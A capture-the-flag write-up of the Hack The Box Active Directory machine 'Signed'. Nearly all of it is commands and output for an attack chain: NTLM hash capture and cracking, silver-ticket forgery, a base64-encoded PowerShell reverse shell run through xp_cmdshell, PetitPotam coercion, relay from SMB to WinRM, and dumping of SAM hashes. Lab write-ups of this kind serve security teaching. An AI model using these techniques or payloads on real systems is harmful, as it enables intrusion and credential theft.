# Signed

Signed is a medium-difficulty Active Directory box created by kavigihan. It involves an MSSQL attack vector and SMB to WinRM attack relay. It contains 2 approaches: one intended and one unintended. This time we were provided with initial credentials `scott:Sm230#C5NatH`

![Signed writeup pic](/assets/img/posts/signed/Screenshot%202026-02-09%20194804.png)


The user scott has access to the MSSQL server

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ nxc mssql SIGNED.HTB -u scott -p 'Sm230#C5NatH' --local-auth
MSSQL       10.129.185.236  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.185.236  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```
Using xp_dirtree we successfully captured the NTLM hash of the mssqlsvc account
```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ mssqlclient.py signed.htb/scott:'Sm230#C5NatH'@10.129.185.236
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)> xp_dirtree \\10.10.14.8\fake\share
subdirectory   depth   file
------------   -----   ----
SQL (scott  guest@master)>

```

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ sudo responder -I tun0
[sudo] password for idh4m:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[SMB] NTLMv2-SSP Client   : 10.129.185.236
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:adfb7d5ec262ce68:7DA425FC648E480B07AD4B0956BD9E46:0101000000000000008A8D567C3CDC01AD7D245FCDB957670000000002000800340057004E00360001001E00570049004E002D0038004C003000590052004B003000370050004900310004003400570049004E002D0038004C003000590052004B00300037005000490031002E00340057004E0036002E004C004F00430041004C0003001400340057004E0036002E004C004F00430041004C0005001400340057004E0036002E004C004F00430041004C0007000800008A8D567C3CDC0106000400020000000800300030000000000000000000000000300000E71E3EEE8DDF4E1EEFAF86A6A4B33E10A5AF5D970C54B2970C47329DBD6D9E8C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0038000000000000000000

```
We successfully cracked it using hashcat `purPLE9795!@`

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ hashcat -m 5600  hash.txt  /usr/share/wordlists/rockyou.txt --show
MSSQLSVC::SIGNED:6e02b8c35118573d:aa110643f72ce31add45142a97be2784:0101000000000000001993cdea3adc0170e22efc5731535b0000000002000800530043003000330001001e00570049004e002d005100440055004b003900380042004a00410058004f0004003400570049004e002d005100440055004b003900380042004a00410058004f002e0053004300300033002e004c004f00430041004c000300140053004300300033002e004c004f00430041004c000500140053004300300033002e004c004f00430041004c0007000800001993cdea3adc01060004000200000008003000300000000000000000000000003000009bee2d4220f11e38534a3c6ae3e68e731b0485738420cafa8c345b92dc6e69090a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0038000000000000000000:purPLE9795!@

```
We reconnected to MSSQL again with the mssqlsvc account

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ mssqlclient.py signed.htb/mssqlsvc:'purPLE9795!@'@10.129.185.236 -windows-auth
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SNAME() AS login_name, master.dbo.fn_varbintohexstr(SUSER_SID()) AS sid_hex
login_name        sid_hex
---------------   ----------------------------------------------------------
SIGNED\mssqlsvc   0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
SQL (SIGNED\mssqlsvc  guest@master)>

```

```python
import struct

def decode_sid(hex_sid):
    b = binascii.unhexlify(hex_sid[2:])  # remove 0x
    revision = b[0]
    sub_auth_count = b[1]
    identifier_authority = int.from_bytes(b[2:8], 'big')
    sub_auths = struct.unpack('<' + 'I'*sub_auth_count, b[8:])
    return "S-%d-%d-%s" % (revision, identifier_authority, '-'.join(str(s) for s in sub_auths))

sid_hex = "0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
sid_str = decode_sid(sid_hex)
domain_sid = '-'.join(sid_str.split('-')[:-1])

print("Full SID :", sid_str)
print("Domain SID:", domain_sid)

#Full SID : S-1-5-21-4088429403-1159899800-2753317549-1103
#Domain SID: S-1-5-21-4088429403-1159899800-2753317549
```

```python
SQL (SIGNED\mssqlsvc  guest@master)> SELECT DISTINCT gr.name FROM sys.server_permissions sp JOIN sys.server_principals gr ON sp.grantee_principal_id = gr.principal_id ORDER BY gr.name
name
---------------------------------------
##MS_AgentSigningCertificate##
##MS_PolicyEventProcessingLogin##
##MS_PolicySigningCertificate##
##MS_PolicyTsqlExecutionLogin##
##MS_SmoExtendedSigningCertificate##
##MS_SQLAuthenticatorCertificate##
##MS_SQLReplicationSigningCertificate##
##MS_SQLResourceSigningCertificate##
NT AUTHORITY\SYSTEM
NT SERVICE\MSSQLSERVER
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
NT SERVICE\SQLWriter
NT SERVICE\Winmgmt
public
sa
scott
SIGNED\Domain Users
SIGNED\IT
```

```python
SELECT SUSER_SID('SIGNED\IT') AS sid_hex
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
#Full SID : S-1-5-21-4088429403-1159899800-2753317549-1105
```

Since we have access to mssqlsvc we used a Silver Ticket to target the `IT` group:

```python
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ iconv -f ASCII -t UTF-16LE <(printf 'purPLE9795!@') | openssl dgst -md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

```python
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/dc01.signed.htb:1433 IT -dc-ip 10.129.69.137 -groups 1105
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/IT
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in IT.ccache

┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ export KRB5CCNAME=IT.ccache
```
After connecting with the ticket we were able to get a reverse shell as mssqlsvc to read the user flag 

```python
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ mssqlclient.py signed.htb/IT@DC01.SIGNED.HTB  -k -no-pass
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "powershell -ec JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AOAAnACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

```python
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.129.185.236] 52045

PS C:\Windows\system32> cd ../../users
PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name                                                               
----                -------------         ------ ----                                                               
d-----        10/7/2025   2:56 AM                Administrator                                                      
d-----        10/2/2025   9:27 AM                mssqlsvc                                                           
d-r---        4/10/2020  10:49 AM                Public                                                             

PS C:\users> type mssqlsvc\Desktop\user.txt
d4f86c00e205ab397bcfe7d40509749a
PS C:\users>
```
# The unintended solution:
We injected the domain admin and the enterprise admin SID in the ticket and we successfully got admin access using a silver ticket attack 

```python
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/dc01.signed.htb:1433 mssqlsvc -dc-ip 10.129.185.236  -groups 519,1105 -user-id 1103
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache

┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ export KRB5CCNAME=mssqlsvc.ccache

```

```python
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ mssqlclient.py signed.htb/mssqlsvc@DC01.SIGNED.HTB  -k -no-pass
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> Create database flag
SQL (SIGNED\mssqlsvc  dbo@master)> use flag
ENVCHANGE(DATABASE): Old Value: master, New Value: flag
INFO(DC01): Line 1: Changed database context to 'flag'.
SQL (SIGNED\mssqlsvc  dbo@flag)> create table flag(content varchar(1000))
SQL (SIGNED\mssqlsvc  dbo@flag)> bulk insert dbo.flag from 'C:\users\administrator\desktop\root.txt'
SQL (SIGNED\mssqlsvc  dbo@flag)> select * from flag
content
-----------------------------------
b'5fefb56476dfd0778999e70d806cacc6'
SQL (SIGNED\mssqlsvc  dbo@flag)>
```
# Intended solution

The machine name was a hint `signed` so we focused on protocol signing. We used chisel to forward the internal network to my localhost

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ chisel server --socks5 --reverse
2025/10/13 19:09:18 server: Reverse tunnelling enabled
2025/10/13 19:09:18 server: Fingerprint f73mkbvBsdj4ZQ/z/CwD4k1TSHWsuKbRvfd192hWXl4=
2025/10/13 19:09:18 server: Listening on http://0.0.0.0:8080
2025/10/13 19:11:58 server: session#3: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/10/13 19:11:58 server: session#3: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.129.185.236] 62593

PS C:\Windows\system32> cd ../../tmp
PS C:\tmp> .\chisel.exe client --fingerprint f73mkbvBsdj4ZQ/z/CwD4k1TSHWsuKbRvfd192hWXl4= 10.10.14.8:8080 R:socks
```

After that we used the new module by nxc `ntlm_reflection` and we got the response that the box was vulnerable to NTLM relay `VULNERABLE (can relay SMB to other protocols except SMB on 224.0.0.1)`
Note: you should update impacket to `v0.14.0`
```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ proxychains  nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M ntlm_reflection
SMB         224.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         224.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
NTLM_REF... 224.0.0.1       445    DC01             VULNERABLE (can relay SMB to other protocols except SMB on 224.0.0.1)
```

NTLM reflection attack (SMB to WinRM)

```bash
┌──(idh4m㉿Kali)-[~/Downloads/tools/krbrelayx]
└─$ proxychains  python3 dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' 10.129.185.236 -a add -r localhost1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA -d 10.10.14.8
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[-] Connecting to host...
[-] Binding to host
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.185.236:389  ...  OK
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
```

```bash
┌──(idh4m㉿Kali)-[~/Downloads/tools]
└─$ proxychains  python3 PetitPotam.py -u 'mssqlsvc' -p 'purPLE9795!@' localhost1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA 10.129.185.236
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                          
              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:10.129.185.236[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.185.236:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

```bash
┌──(idh4m㉿Kali)-[~/Downloads/tools/impacket]
└─$ proxychains ntlmrelayx.py -t winrms://DC01.SIGNED.HTB -smb2support
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.185.236, attacking target winrms://DC01.SIGNED.HTB
[!] The client requested signing, relaying to WinRMS might not work!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.185.236 against winrms://DC01.SIGNED.HTB SUCCEED [1]
[*] winrms:///@dc01.signed.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] (SMB): Received connection from 10.129.185.236, attacking target winrms://DC01.SIGNED.HTB
[!] The client requested signing, relaying to WinRMS might not work!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.185.236 against winrms://DC01.SIGNED.HTB SUCCEED [2]
[*] winrms:///@dc01.signed.htb [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001
```

Rooted

```bash

┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ rlwrap nc 127.0.0.1 11001
Type help for list of commands
# TYPE c:\Users\Administrator\Desktop\root.txt
5fefb56476dfd0778999e70d806cacc6
```

Credential dumping 

```python
┌──(idh4m㉿Kali)-[~/Downloads/tools]
└─$ rlwrap nc localhost 11001
Type help for list of commands

# dir c:\temp
Volume in drive C has no label.
Volume Serial Number is BED4-436E

 Directory of c:\temp

10/14/2025  06:11 PM    <DIR>          .
10/14/2025  06:11 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   6,316,326,912 bytes free

# reg save HKLM\SAM C:\temp\sam.hive
The operation completed successfully.

# reg save HKLM\SYSTEM C:\temp\system.hive
The operation completed successfully.

# dir
Volume in drive C has no label.
Volume Serial Number is BED4-436E

 Directory of C:\Windows\system32\config\systemprofile

10/14/2025  06:06 PM    <DIR>          .
10/14/2025  06:06 PM    <DIR>          ..
09/15/2018  12:19 AM    <DIR>          AppData
10/14/2025  06:06 PM            45,056 sam.hive
10/14/2025  06:06 PM        17,035,264 system.hive
               2 File(s)     17,080,320 bytes
               3 Dir(s)   6,299,246,592 bytes free

# net share
Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
NETLOGON     C:\Windows\SYSVOL\sysvol\SIGNED.HTB\SCRIPTS
                                             Logon server share
SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share
temp         C:\temp
The command completed successfully.
```

```python
┌──(idh4m㉿Kali)-[~/…/224.0.0.1/SYSVOL/SIGNED.HTB/Policies]
└─$ proxychains smbclient.py signed.htb/mssqlsvc:'purPLE9795!@'@10.129.249.62
# use temp
# ls
drw-rw-rw-          0  Tue Oct 14 21:14:21 2025 .
drw-rw-rw-          0  Tue Oct 14 21:14:21 2025 ..
-rw-rw-rw-      45056  Tue Oct 14 21:14:13 2025 sam.hive
-rw-rw-rw-   17035264  Tue Oct 14 21:14:21 2025 system.hive
# get sam.hive
# get system.hive
```

```python
┌──(idh4m㉿Kali)-[~/…/224.0.0.1/SYSVOL/SIGNED.HTB/Policies]
└─$ secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xad7915b8e6d4f9ee383a5176349739e3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d5841be5e81a414505cc1e867284c6e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

This is my first official writeup, I hope you enjoyed reading it! 